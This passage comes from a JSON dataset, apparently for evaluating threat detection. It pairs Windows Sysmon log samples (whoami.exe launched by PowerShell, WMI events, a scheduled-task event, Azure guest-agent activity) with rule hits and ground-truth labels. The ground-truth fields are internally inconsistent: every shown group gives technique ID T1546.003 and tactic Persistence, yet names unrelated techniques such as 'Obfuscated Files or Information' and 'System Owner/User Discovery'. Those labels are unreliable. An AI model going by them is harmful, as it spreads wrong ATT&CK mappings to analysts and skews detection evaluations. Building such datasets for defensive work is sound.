          "idx": 76642,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.250000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        },
        {
          "idx": 76643,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:48:31.250000+00:00",
          "Image": "C:\\windows\\system32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\S-1-5-21-2079883792-3656946353-945924832-1104_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppModel\\SystemAppData\\Microsoft.Wi"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Obfuscated Files or Information",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": true,
      "gt_notes": "auto: anchor-kw(powershell)"
    },
    {
      "group_id": "T1033_79473",
      "rule_technique_id": "T1033",
      "rule_technique_name": "System Owner/User Discovery",
      "confidence": 1.0,
      "anchor": {
        "idx": 79473,
        "EventID": 1,
        "Image": "C:\\Windows\\System32\\whoami.exe",
        "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
        "TimeCreated": "2020-09-04 20:49:36.765000+00:00"
      },
      "num_events": 32,
      "event_id_distribution": {
        "7": 24,
        "12": 4,
        "17": 1,
        "18": 1,
        "1": 1,
        "5": 1
      },
      "sample_logs": [
        {
          "idx": 79177,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:49:30.621000+00:00",
          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
        },
        {
          "idx": 79459,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:49:35.759000+00:00",
          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
        },
        {
          "idx": 79470,
          "EventID": 17,
          "TimeCreated": "2020-09-04 20:49:36.762000+00:00",
          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79472,
          "EventID": 18,
          "TimeCreated": "2020-09-04 20:49:36.763000+00:00",
          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79473,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:49:36.765000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 79476,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.765000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79480,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.767000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79481,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.768000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79483,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.769000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79484,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.770000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79485,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.770000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79486,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.771000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79487,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.771000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79488,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.772000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 79489,
          "EventID": 7,
          "TimeCreated": "2020-09-04 20:49:36.772000+00:00",
          "Image": "C:\\Windows\\System32\\whoami.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "System Owner/User Discovery",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": true,
      "gt_notes": "auto: sample-kw+ctx(T1033,c=1.00)"
    },
    {
      "group_id": "T1047_877",
      "rule_technique_id": "T1047",
      "rule_technique_name": "Windows Management Instrumentation",
      "confidence": 1.0,
      "anchor": {
        "idx": 877,
        "EventID": 5857,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:43:31.648000+00:00"
      },
      "num_events": 25,
      "event_id_distribution": {
        "3": 16,
        "5857": 5,
        "1": 4
      },
      "sample_logs": [
        {
          "idx": 877,
          "EventID": 5857,
          "TimeCreated": "2020-09-04 20:43:31.648000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 880,
          "EventID": 5857,
          "TimeCreated": "2020-09-04 20:43:31.649000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 987,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.683000+00:00",
          "Image": "C:\\Windows\\System32\\dns.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 988,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.683000+00:00",
          "Image": "C:\\Windows\\System32\\dns.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 989,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.685000+00:00",
          "Image": "C:\\Windows\\System32\\dns.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 990,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.686000+00:00",
          "Image": "C:\\Windows\\System32\\dns.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 991,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.686000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 992,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:33.687000+00:00",
          "Image": "System",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1190,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:35.769000+00:00",
          "Image": "C:\\Windows\\System32\\lsass.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1192,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:35.770000+00:00",
          "Image": "C:\\Windows\\System32\\lsass.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1194,
          "EventID": 3,
          "TimeCreated": "2020-09-04 20:43:35.771000+00:00",
          "Image": "C:\\Windows\\System32\\lsass.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1288,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:43:35.811000+00:00",
          "Image": "C:\\Windows\\System32\\sppsvc.exe",
          "CommandLine": "C:\\windows\\system32\\sppsvc.exe",
          "ParentImage": "C:\\Windows\\System32\\services.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 1340,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:43:35.841000+00:00",
          "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine": "C:\\windows\\system32\\wbem\\wmiprvse.exe -Embedding",
          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 1420,
          "EventID": 5857,
          "TimeCreated": "2020-09-04 20:43:36.881000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 1421,
          "EventID": 5857,
          "TimeCreated": "2020-09-04 20:43:36.882000+00:00",
          "Image": "nan",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        }
      ],
      "gt_technique_id": "T1546.003",
      "gt_technique_name": "Windows Management Instrumentation",
      "gt_tactic": "Persistence",
      "gt_is_true_positive": true,
      "gt_notes": "auto: sample-kw+ctx(T1047,c=1.00)"
    },
    {
      "group_id": "T1053_005_3440",
      "rule_technique_id": "T1053.005",
      "rule_technique_name": "Scheduled Task",
      "confidence": 1.0,
      "anchor": {
        "idx": 3440,
        "EventID": 4702,
        "Image": "nan",
        "CommandLine": "nan",
        "TimeCreated": "2020-09-04 20:44:06.921000+00:00"
      },
      "num_events": 34,
      "event_id_distribution": {
        "12": 17,
        "13": 11,
        "1": 4,
        "11": 1,
        "4702": 1
      },
      "sample_logs": [
        {
          "idx": 3247,
          "EventID": 11,
          "TimeCreated": "2020-09-04 20:43:57.823000+00:00",
          "Image": "C:\\windows\\System32\\svchost.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "nan"
        },
        {
          "idx": 3255,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:00.831000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "\"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\5bd8d21f-ae52-47f7-84f4-7cec337c3a5d.zip",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\WaAppAgent.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 3259,
          "EventID": 1,
          "TimeCreated": "2020-09-04 20:44:00.833000+00:00",
          "Image": "C:\\Windows\\System32\\conhost.exe",
          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
          "ParentImage": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "TargetObject": "nan"
        },
        {
          "idx": 3374,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.897000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3375,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.897000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3376,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.897000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3377,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.898000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3378,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.898000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3381,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.899000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3379,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.899000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3380,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.899000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3382,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.900000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
        {
          "idx": 3383,
          "EventID": 12,
          "TimeCreated": "2020-09-04 20:44:05.901000+00:00",
          "Image": "C:\\WindowsAzure\\GuestAgent_2.7.41491.993_2020-09-04_183104\\CollectGuestLogs.exe",
          "CommandLine": "nan",
          "ParentImage": "nan",
          "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
        },
